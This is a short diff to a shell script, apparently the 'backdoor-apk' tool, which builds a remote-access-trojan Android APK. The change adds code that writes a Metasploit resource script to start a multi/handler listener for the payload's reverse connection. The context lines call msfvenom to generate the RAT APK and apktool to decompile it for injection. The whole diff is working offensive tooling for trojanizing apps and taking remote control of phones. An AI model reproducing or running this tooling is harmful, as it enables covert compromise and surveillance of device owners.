@@ -170,6 +170,18 @@ function init {
 # kick things off
 init
 
+# generate Metasploit resource script
+# credit to John Troony for the suggestion
+cat >$MY_PATH/backdoor-apk.rc <<EOL
+use exploit/multi/handler
+set PAYLOAD $PAYLOAD
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+exploit -j -z
+EOL
+echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"
+
 echo -n "[*] Generating RAT APK file..."
 $MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -178,8 +190,6 @@ if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
   echo "[!] Failed to generate RAT APK file"
   exit 1
 fi
-echo "[+] Using payload: $PAYLOAD"
-echo "[+] Handle the reverse connection at: $LHOST:$LPORT"
 
 echo -n "[*] Decompiling RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
